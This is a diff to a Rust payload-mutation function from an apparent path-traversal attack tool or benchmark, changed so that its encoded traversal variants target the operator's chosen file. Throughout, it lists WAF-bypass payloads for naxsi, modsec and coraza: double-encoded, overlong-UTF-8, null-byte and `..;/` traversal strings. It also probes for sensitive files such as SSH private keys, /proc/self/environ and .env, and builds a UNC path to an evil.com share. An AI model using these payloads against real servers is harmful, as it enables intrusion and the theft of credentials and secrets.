@@ -35,6 +35,28 @@ pub fn mutate(payload: &str) -> Vec<String> {
         }
     };
     let target = infer_target_path(payload);
+    // ANTI-RIG: the encoded-traversal forms used to be hardcoded to
+    // `etc/passwd` regardless of what the operator actually asked to
+    // read — so a `../../../../var/www/app/config/db.yml` attack
+    // "mutated" into a `/etc/passwd` read. That is a different attack,
+    // and the de-rigged bench would claim "you can read db.yml" when
+    // only passwd was ever tested. Every encoded form now traverses to
+    // the operator's REAL inferred target.
+    let tgt = target.trim_start_matches(['/', '\\']).to_string();
+    let tgt_bs = tgt.replace('/', "\\");
+    // The canned no-traversal absolute-file list (`/proc/self/environ`,
+    // `/.ssh/id_rsa`, …) is the legitimate "read a sensitive file"
+    // probe arsenal ONLY when the operator's target is itself the
+    // generic passwd/system probe. For a specific target those sibling
+    // files are a different attack — emit the operator's real file as
+    // the no-`..` naxsi-friendly form instead.
+    let tl = target.to_ascii_lowercase();
+    let generic = tl.is_empty()
+        || tl.contains("passwd")
+        || tl.contains("system32")
+        || tl.contains("/proc")
+        || tl.starts_with("proc")
+        || tl.contains("/etc/");
 
     // ── No-traversal absolute paths FIRST (naxsi-class WAF bypass) ───
     // naxsi blocks any `..` sequence; encoded variants too. Plain
@@ -46,44 +68,54 @@ pub fn mutate(payload: &str) -> Vec<String> {
     //   /var/log/auth.log  → 200 ✓
     //   /.ssh/id_rsa       → 200 ✓
     //   /.git/config       → 200 ✓
-    for naxsi_friendly in [
-        "/proc/self/environ",
-        "/proc/self/cmdline",
-        "/proc/self/maps",
-        "/proc/version",
-        "/var/log/auth.log",
-        "/var/log/syslog",
-        "/.ssh/id_rsa",
-        "/.ssh/authorized_keys",
-        "/.git/config",
-        "/.git/HEAD",
-        "/.env",
-        "/var/www/html/.env",
-        "/home/user/.bash_history",
-        "/root/.bash_history",
-        "C:/Windows/System32/drivers/etc/hosts",
-        "C:/inetpub/wwwroot/web.config",
-    ] {
-        push(naxsi_friendly.to_string(), &mut results, &mut seen);
+    if generic {
+        for naxsi_friendly in [
+            "/proc/self/environ",
+            "/proc/self/cmdline",
+            "/proc/self/maps",
+            "/proc/version",
+            "/var/log/auth.log",
+            "/var/log/syslog",
+            "/.ssh/id_rsa",
+            "/.ssh/authorized_keys",
+            "/.git/config",
+            "/.git/HEAD",
+            "/.env",
+            "/var/www/html/.env",
+            "/home/user/.bash_history",
+            "/root/.bash_history",
+            "C:/Windows/System32/drivers/etc/hosts",
+            "C:/inetpub/wwwroot/web.config",
+        ] {
+            push(naxsi_friendly.to_string(), &mut results, &mut seen);
+        }
+    } else {
+        // The operator's REAL target, no `..` — the naxsi bypass for
+        // exactly the file they asked for, not a canned sibling.
+        push(format!("/{tgt}"), &mut results, &mut seen);
+        push(format!("/{tgt}%00.json"), &mut results, &mut seen);
+        push(format!("/{tgt};.json"), &mut results, &mut seen);
     }
 
     // ── Encoded `..` traversal forms (modsec / coraza / generic WAFs) ─
+    // Every form below carries the operator's inferred target `tgt`,
+    // never a hardcoded `etc/passwd`.
     for variant in [
-        "..%2f..%2f..%2fetc/passwd",
-        "..%252f..%252f..%252fetc/passwd",
-        "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
-        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
-        "../../../etc/passwd%00.jpg",
-        "..\\..\\..\\etc\\passwd",
-        "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
-        "....//....//....//etc/passwd",
-        "..;/..;/..;/etc/passwd",
-        "..%00/..%00/..%00/etc/passwd",
-        "..\\..\\WINDOWS\\system32",
-        "\\\\evil.com\\share",
-        "/proc/self/root/etc/passwd",
+        format!("..%2f..%2f..%2f{tgt}"),
+        format!("..%252f..%252f..%252f{tgt}"),
+        format!("%2e%2e/%2e%2e/%2e%2e/{tgt}"),
+        format!("%2e%2e%2f%2e%2e%2f%2e%2e%2f{tgt}"),
+        format!("../../../{tgt}%00.jpg"),
+        format!("..\\..\\..\\{tgt_bs}"),
+        format!("%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/{tgt}"),
+        format!("....//....//....//{tgt}"),
+        format!("..;/..;/..;/{tgt}"),
+        format!("..%00/..%00/..%00/{tgt}"),
+        "..\\..\\WINDOWS\\system32".to_string(),
+        "\\\\evil.com\\share".to_string(),
+        format!("/proc/self/root/{tgt}"),
     ] {
-        push(variant.to_string(), &mut results, &mut seen);
+        push(variant, &mut results, &mut seen);
     }
 
     if target.contains("windows") || target.contains("system32") {
